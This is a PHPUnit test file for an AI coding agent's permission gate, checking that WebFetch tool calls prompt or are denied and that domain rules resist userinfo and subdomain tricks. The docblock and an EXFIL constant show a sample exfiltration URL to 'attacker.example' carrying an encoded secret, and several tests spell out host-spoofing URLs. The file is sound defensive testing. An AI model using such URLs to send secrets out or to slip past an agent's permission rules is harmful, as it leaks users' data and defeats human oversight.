<?php

declare(strict_types=1);

namespace SugarCraft\Crush\Tests\Permissions;

use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;
use SugarCraft\Crush\Permissions\FetchTarget;
use SugarCraft\Crush\Permissions\PermissionAction;
use SugarCraft\Crush\Permissions\PermissionDecision;
use SugarCraft\Crush\Permissions\PermissionGate;
use SugarCraft\Crush\Permissions\PermissionMode;
use SugarCraft\Crush\Permissions\PermissionRule;
use SugarCraft\Crush\Permissions\SafetyClassifier;
use SugarCraft\Crush\ToolCall;

/**
 * `WebFetch` is no longer a read (audit F-P6), and `WebFetch(domain:…)` rules
 * give back the hosts a user trusts.
 *
 * Before the fix `WebFetch https://attacker.example/?d=<secret>` was Allow in
 * `default`, `plan` and `dont-ask` with no prompt, because
 * `PermissionGate::isReadOnlyTool()` listed it; and a `domain:` rule —
 * Claude Code's spelling, which imported presets already carry — matched
 * nothing, since the url was globbed literally.
 */
final class WebFetchPermissionTest extends TestCase
{
    private const EXFIL = 'https://attacker.example/?d=c2VjcmV0';

    private static function fetch(string $url): ToolCall
    {
        return new ToolCall('WebFetch', ['url' => $url]);
    }

    /**
     * The audit's gate table, with no rules configured.
     *
     * @return iterable<string, array{PermissionMode, PermissionDecision}>
     */
    public static function modeTable(): iterable
    {
        yield 'default asks' => [PermissionMode::Default, PermissionDecision::Ask];
        yield 'accept-edits asks' => [PermissionMode::AcceptEdits, PermissionDecision::Ask];
        yield 'plan asks' => [PermissionMode::Plan, PermissionDecision::Ask];
        yield 'dont-ask denies' => [PermissionMode::DontAsk, PermissionDecision::Deny];
        yield 'bypass allows' => [PermissionMode::BypassPermissions, PermissionDecision::Allow];
    }

    #[DataProvider('modeTable')]
    public function testAFetchIsNoLongerARead(PermissionMode $mode, PermissionDecision $expected): void
    {
        $gate = new PermissionGate($mode, [], new SafetyClassifier());

        self::assertSame($expected, $gate->evaluate(self::fetch(self::EXFIL)));
        self::assertSame($expected, $gate->evaluate(self::fetch('https://example.com/')));
    }

    /**
     * `dont-ask` + an allow rule for a trusted host: that host runs, any other
     * host is still denied — the audit's test, both halves.
     */
    public function testAnAllowDomainRuleGrantsThatHostAndNoOther(): void
    {
        $gate = new PermissionGate(
            PermissionMode::DontAsk,
            [new PermissionRule('WebFetch(domain:docs.example.com)', PermissionAction::Allow)],
        );

        self::assertSame(PermissionDecision::Allow, $gate->evaluate(self::fetch('https://docs.example.com/a?b=c')));
        self::assertSame(PermissionDecision::Allow, $gate->evaluate(self::fetch('http://DOCS.Example.com./x')));
        self::assertSame(PermissionDecision::Deny, $gate->evaluate(self::fetch(self::EXFIL)));
        self::assertSame(
            PermissionDecision::Deny,
            $gate->evaluate(self::fetch('https://evil.docs.example.com/')),
            'a grant covers exactly the host it spells, not its subdomains',
        );
        self::assertSame(
            PermissionDecision::Deny,
            $gate->evaluate(self::fetch('https://docs.example.com.evil.example/')),
        );
    }

    /**
     * The userinfo trick: the host the tool dials is the one after `@`, and
     * the rule must see that host, not the text before it.
     */
    public function testAnAllowRuleIsNotFooledByUserinfo(): void
    {
        $gate = new PermissionGate(
            PermissionMode::DontAsk,
            [new PermissionRule('WebFetch(domain:github.com)', PermissionAction::Allow)],
        );

        self::assertSame(
            PermissionDecision::Deny,
            $gate->evaluate(self::fetch('https://github.com@attacker.example/')),
        );
    }

    public function testAGlobDomainGrantsSubdomainsOnly(): void
    {
        $gate = new PermissionGate(
            PermissionMode::Default,
            [new PermissionRule('WebFetch(domain:*.github.com)', PermissionAction::Allow)],
        );

        self::assertSame(PermissionDecision::Allow, $gate->evaluate(self::fetch('https://api.github.com/x')));
        self::assertSame(PermissionDecision::Ask, $gate->evaluate(self::fetch('https://github.com/x')));
    }

    /**
     * A restrictive rule covers the host AND its subdomains, so a deny cannot
     * be stepped around with one more label; and it fires on a URL nobody can
     * parse, where a grant does not.
     */
    public function testADenyDomainRuleCoversSubdomainsAndUnparseableUrls(): void
    {
        $deny = new PermissionGate(
            PermissionMode::BypassPermissions,
            [new PermissionRule('WebFetch(domain:attacker.example)', PermissionAction::Deny)],
        );

        self::assertSame(PermissionDecision::Deny, $deny->evaluate(self::fetch(self::EXFIL)));
        self::assertSame(PermissionDecision::Deny, $deny->evaluate(self::fetch('https://x.attacker.example/')));
        self::assertSame(PermissionDecision::Allow, $deny->evaluate(self::fetch('https://example.com/')));
        self::assertSame(PermissionDecision::Deny, $deny->evaluate(self::fetch('not a url')));

        $allow = new PermissionGate(
            PermissionMode::DontAsk,
            [new PermissionRule('WebFetch(domain:example.com)', PermissionAction::Allow)],
        );
        self::assertSame(PermissionDecision::Deny, $allow->evaluate(self::fetch('ftp://example.com/')));
        self::assertSame(PermissionDecision::Deny, $allow->evaluate(new ToolCall('WebFetch', [])));
    }

    /**
     * A non-`domain:` argument pattern keeps its literal url glob, so a rule
     * written before this change means what it meant.
     */
    public function testALiteralUrlGlobStillMatchesTheUrl(): void
    {
        $gate = new PermissionGate(
            PermissionMode::DontAsk,
            [new PermissionRule('WebFetch(https://example.com/*)', PermissionAction::Allow)],
        );

        self::assertSame(PermissionDecision::Allow, $gate->evaluate(self::fetch('https://example.com/a')));
        self::assertSame(PermissionDecision::Deny, $gate->evaluate(self::fetch('https://other.example/a')));
    }

    /**
     * {@see FetchTarget} parses the way WebFetch dials.
     *
     * @return iterable<string, array{mixed, ?string, bool, bool}>
     */
    public static function targets(): iterable
    {
        yield 'plain' => ['https://example.com/a', 'example.com', false, false];
        yield 'query' => ['https://example.com/a?k=v', 'example.com', true, false];
        yield 'empty query' => ['https://example.com/a?', 'example.com', false, false];
        yield 'fragment is not sent' => ['https://example.com/#k=v', 'example.com', false, false];
        yield 'userinfo' => ['https://u:p@example.com/', 'example.com', false, true];
        yield 'userinfo hides the host' => ['https://github.com@evil.example/', 'evil.example', false, true];
        yield 'uppercase + root dot' => ['http://EXAMPLE.com./', 'example.com', false, false];
        yield 'ipv6 literal' => ['https://[::1]/', '::1', false, false];
        yield 'no scheme' => ['example.com/a', null, false, false];
        yield 'other scheme' => ['ftp://example.com/', null, false, false];
        yield 'uppercase scheme (the tool refuses it too)' => ['HTTPS://example.com/', null, false, false];
        yield 'no host' => ['https:///path', null, false, false];
        yield 'not a string' => [42, null, false, false];
    }

    #[DataProvider('targets')]
    public function testFetchTargetReadsTheUrlTheToolDials(
        mixed $url,
        ?string $host,
        bool $query,
        bool $userInfo,
    ): void {
        $target = FetchTarget::fromUrl($url);

        if ($host === null) {
            self::assertNull($target);

            return;
        }

        self::assertNotNull($target);
        self::assertSame($host, $target->host);
        self::assertSame($query, $target->carriesQuery);
        self::assertSame($userInfo, $target->carriesUserInfo);
    }
}
